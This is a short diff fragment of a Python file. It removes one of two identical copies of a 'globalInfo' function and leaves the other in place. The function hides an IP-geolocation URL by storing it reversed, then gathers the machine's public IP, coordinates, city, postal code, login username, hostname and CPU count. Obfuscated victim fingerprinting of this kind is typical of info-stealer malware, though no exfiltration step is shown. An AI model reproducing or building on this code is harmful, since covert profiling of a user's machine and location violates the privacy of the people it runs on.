@@ -373,26 +373,6 @@ def systemInfo():
 
     return sys_info
 
-
-def globalInfo():
-    
-    url = 'nosj/oi.ofnipi//:sptth'
-    response = urllib.request.urlopen(url[::-1])
-    data = json.loads(response.read().decode())
-    ip = data['ip']
-    loc = data['loc']
-    location = loc.split(',')
-    latitude = location[0]
-    longitude = location[1]
-    username = os.getlogin()
-    country = data['country']
-    country_code = data['country'].lower()
-    region = data['region']
-    city = data['city']
-    postal = data['postal']
-    computer_name = socket.gethostname()
-    cores = os.cpu_count()
-    gpu = ''
 def globalInfo():
     
     url = 'nosj/oi.ofnipi//:sptth'
